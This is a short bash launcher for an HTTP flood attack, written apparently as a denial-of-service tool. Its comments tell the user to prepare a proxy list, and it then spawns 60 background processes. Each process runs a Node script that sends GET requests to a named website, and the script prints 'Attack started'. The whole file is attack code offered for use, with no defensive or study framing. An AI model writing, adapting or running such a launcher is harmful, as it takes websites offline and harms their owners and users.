#!/bin/bash
#
#  Please prepared proxies list at first.
#  And then change the command in atk_cmd
#  And change the process number
#  Lastly run this script
#
#the command you want to exec
atk_cmd="node http1.js GET https://amokdev.site https.txt 500 100 5"

#number of process that you want
process=60

#change the system limit
ulimit -n 100

echo Attack started
for ((i=1;i<=$process;i++))
do
  $atk_cmd >/dev/null &
  sleep 0.1
done
